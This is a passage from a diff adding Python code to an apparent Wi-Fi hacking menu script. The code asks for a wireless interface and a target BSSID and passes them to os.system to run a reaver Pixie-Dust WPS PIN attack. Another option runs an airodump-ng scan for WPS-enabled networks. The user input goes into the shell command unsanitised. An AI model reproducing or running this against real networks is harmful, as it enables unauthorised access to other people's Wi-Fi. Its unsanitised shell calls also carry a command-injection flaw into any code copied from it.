+            print("\nEnter the interface to start ?(Default(Wlan0mon/Wlan1mon)")
+            interface = str(input(""))
+            print("\nEnter the bssid of the network ?")
+            bssid = str(input(""))
+            order = ("reaver -i {} -b {} -K").format(interface,bssid)
+            geny = os.system(order)
+            intro()
+        elif attack == 0 :
+            intro()
+    elif var == 11:
+        print("\nEnter the interface to start ?(Default(Wlan0mon/Wlan1mon)")
+        interface = str(input(""))
+        order = "airodump-ng -M --wps {}".format(interface)
+        geny = os.system(order)
+        cmd = os.system("sleep 5 ")
+        intro()
+    else:
+        print("Not Found")
+        cmd = os.system("sleep 2")
+        intro()
+intro()
